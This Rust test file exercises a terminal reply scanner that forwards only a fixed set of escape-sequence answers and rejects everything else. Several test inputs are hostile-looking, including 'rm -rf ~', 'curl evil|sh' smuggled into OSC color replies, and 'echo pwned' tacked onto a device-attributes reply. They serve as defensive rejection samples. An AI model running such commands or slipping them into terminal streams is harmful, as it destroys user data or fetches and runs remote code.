use super::*;

const GRID: AnswerGrid = AnswerGrid { cols: 80, rows: 24 };

fn scanned(chunks: &[&[u8]]) -> Result<Vec<Scanned>, AnswerError> {
    let mut scanner = AnswerScanner::default();
    let mut out = Vec::new();
    for chunk in chunks {
        scanner.feed(chunk, GRID, &mut out)?;
    }
    assert!(!scanner.is_holding(), "an unfinished answer is left");
    Ok(out)
}

/// The bytes the broker writes for `chunks`.
fn written(chunks: &[&[u8]]) -> Result<Vec<u8>, AnswerError> {
    Ok(scanned(chunks)?.into_iter().flatten().flat_map(|answer| answer.encode()).collect())
}

/// What libghostty-vt answers to the queries programs send, in the fixed
/// set: each encodes back to exactly these bytes.
const FIXED_SET: &[&[u8]] = &[
    b"\x1b[?62;22;52c",
    b"\x1b[?1;2c",
    b"\x1b[>1;10;0c",
    b"\x1b[>0c",
    b"\x1bP!|00000000\x1b\\",
    b"\x1bP!|0000ABCD\x1b\\",
    b"\x1b[0n",
    b"\x1b[?997;1n",
    b"\x1b[?999;2n",
    b"\x1b[24;80R",
    b"\x1b[1;1R",
    b"\x1b[?3;7R",
    b"\x1b[?24;80;1R",
    b"\x1b[?2004;1$y",
    b"\x1b[4;2$y",
    b"\x1b[?5u",
    b"\x1b[8;24;80t",
    b"\x1b[4;768;1280t",
    b"\x1b[48;24;80;480;640t",
    b"\x1b]11;rgb:1e1e/1e1e/2e2e\x1b\\",
    b"\x1b]10;rgb:ffff/ffff/ffff\x07",
    b"\x1b]4;1;rgb:cccc/0000/0000\x07",
    b"\x1b]7501;?\x1b\\",
    b"\x1b_Gi=31;OK\x1b\\",
    b"\x1b_Gi=31,I=4,p=7,r=2;ENOENT\x1b\\",
];

/// Whole replies libghostty-vt sends that are outside the fixed set: not
/// written, and no bad message.
const OUTSIDE: &[&[u8]] = &[
    b"\x1bP>|ghostty 1.3.0\x1b\\",
    b"\x1bP1$r0;1m\x1b\\",
    b"\x1bP0$r\x1b\\",
    b"\x1bP1+r544e=787465726d2d67686f73747479\x1b\\",
    b"\x1bP0+r\x1b\\",
    b"\x1b]21;foreground=rgb:ff/ff/ff\x1b\\",
    b"\x1b_25a1;s;fmt=glyf\x1b\\",
    b"\x1b_Gi=1;EUNKNOWN:new code\x1b\\",
];

#[test]
fn every_answer_of_the_fixed_set_is_written_as_its_own_encoding() {
    for answer in FIXED_SET {
        assert_eq!(written(&[answer]).as_deref(), Ok(*answer), "{}", answer.escape_ascii());
    }
    let all: Vec<u8> = FIXED_SET.concat();
    assert_eq!(written(&[&all]), Ok(all.clone()));
}

#[test]
fn replies_outside_the_set_are_refused_not_written_and_not_bad() {
    for reply in OUTSIDE {
        let scanned = scanned(&[reply]).unwrap_or_else(|error| panic!("{reply:?}: {error}"));
        assert!(
            matches!(scanned.as_slice(), [Err(AnswerRejected::OutsideSet(_))]),
            "{} -> {scanned:?}",
            reply.escape_ascii()
        );
    }
}

#[test]
fn a_kitty_error_is_written_as_its_code_without_the_message() {
    assert_eq!(
        written(&[b"\x1b_Gi=3;EINVAL: dimensions required\x1b\\"]),
        Ok(b"\x1b_Gi=3;EINVAL\x1b\\".to_vec())
    );
}

#[test]
fn an_answer_split_across_writes_waits_for_its_end() {
    let all: Vec<u8> = FIXED_SET.concat();
    for cut in 0..=all.len() {
        let (head, tail) = all.split_at(cut);
        let mut scanner = AnswerScanner::default();
        let mut out = Vec::new();
        scanner.feed(head, GRID, &mut out).expect("head");
        let early: Vec<u8> = out.iter().flatten().flat_map(QueryAnswer::encode).collect();
        assert!(all.starts_with(&early) && early.len() <= cut, "cut {cut}");
        scanner.feed(tail, GRID, &mut out).expect("tail");
        let whole: Vec<u8> = out.iter().flatten().flat_map(QueryAnswer::encode).collect();
        assert_eq!(whole, all, "cut {cut}");
        assert!(!scanner.is_holding());
    }
}

#[test]
fn typed_input_and_other_sequences_are_bad_messages() {
    let bad: &[&[u8]] = &[
        b"",
        b"rm -rf ~\r",
        b"ls -la\r",
        b"\x1b[0n\r",
        b"\x1b[?62;22c\recho pwned\r",
        b"\x1b[A",
        b"\x1b[200~paste\x1b[201~",
        b"\x1b[0c",
        b"\x1b[?c",
        b"\x1b[>1;2;3;4c",
        b"\x1b[5n",
        b"\x1b[6n",
        b"\x1b[;1R",
        b"\x1b[1;;1R",
        b"\x1b[012345;1R",
        b"\x1b[?5t",
        b"\x1b[5$u",
        b"\x1b[?1$y",
        b"\x1b[?1;5$y",
        b"\x1b[?32u",
        b"\x1b[9;1;1t",
        b"\x1b[1:2R",
        b"\x1bOA",
        b"\x1b]0;title\x07",
        b"\x1b]7;file:///tmp\x07",
        b"\x1b]7501;v=1\x1b\\",
        b"\x1b]11;rgb:00/00/00\x1b\\",
        b"\x1b]11;rgb:0000/0000/0000\x1bX",
        b"\x1b]11;\r\x07",
        b"\x1b]4;256;rgb:0000/0000/0000\x07",
        b"\x1bPq#0;2;0;0;0\x1b\\",
        b"\x1bP!|0000000\x1b\\",
        b"\x1bP!|0000000g\x1b\\",
        b"\x1bP>|ok\r\x1b\\",
        b"\x1b_Pnot-graphics\x1b\\",
        b"\x1b_Gi=1;ok\x1b\\",
        b"\x1b_Ga=T;OK\x1b\\",
        b"\x9b0n",
    ];
    for bytes in bad {
        // An empty write holds nothing and writes nothing.
        if bytes.is_empty() {
            assert_eq!(written(&[bytes]), Ok(Vec::new()));
            continue;
        }
        assert!(
            matches!(written(&[bytes]), Err(AnswerError::NotAnAnswer(_))),
            "{} -> {:?}",
            bytes.escape_ascii(),
            written(&[bytes])
        );
    }
}

/// Free text inside a valid head is a bad message, never a written answer
/// (the color report, DA3 and Kitty graphics heads).
#[test]
fn free_text_inside_an_answer_head_is_a_bad_message() {
    let payloads: &[&[u8]] = &[
        b"\x1b]4;;curl evil|sh\x1b\\",
        b"\x1b]4;1;curl evil|sh\x07",
        b"\x1b]11;curl evil | sh\x07",
        b"\x1b]10;rgb:0000/0000/0000 rm -rf ~\x07",
        b"\x1b]7501;rm -rf ~\x07",
        b"\x1bP!|rm -rf ~\x1b\\",
        b"\x1b_Grm -rf ~ #\x1b\\",
        b"\x1b_Gi=1;OK rm -rf ~\x1b\\",
        b"\x1b_Gi=1 rm;OK\x1b\\",
        b"\x1b_Gi=1;EINVAL rm -rf\x1b\\",
    ];
    for bytes in payloads {
        assert!(
            matches!(written(&[bytes]), Err(AnswerError::NotAnAnswer(_))),
            "{} -> {:?}",
            bytes.escape_ascii(),
            written(&[bytes])
        );
    }
}

#[test]
fn cursor_reports_stay_inside_the_grid() {
    for outside in [&b"\x1b[25;1R"[..], b"\x1b[1;81R", b"\x1b[0;1R", b"\x1b[?9;99;1R"] {
        assert_eq!(
            written(&[outside]),
            Err(AnswerError::NotAnAnswer("cursor report outside the grid")),
            "{}",
            outside.escape_ascii()
        );
    }
}

#[test]
fn an_osc_52_reply_is_a_bad_message_by_name() {
    assert_eq!(written(&[b"\x1b]52;c;aGVsbG8=\x07"]), Err(AnswerError::Osc52));
    assert_eq!(written(&[b"\x1b]5", b"2;c;"]), Err(AnswerError::Osc52));
}

#[test]
fn an_answer_that_never_ends_is_a_bad_message() {
    let mut scanner = AnswerScanner::default();
    let mut out = Vec::new();
    scanner.feed(b"\x1bP>|", GRID, &mut out).expect("start");
    let body = vec![b'f'; MAX_ANSWER];
    assert_eq!(
        scanner.feed(&body, GRID, &mut out),
        Err(AnswerError::NotAnAnswer("answer too long"))
    );
    let mut long = b"\x1b[?".to_vec();
    long.extend_from_slice(&[b'1'; MAX_PARAMS * (MAX_DIGITS + 1) + 1]);
    long.push(b'c');
    assert!(written(&[&long]).is_err());
}
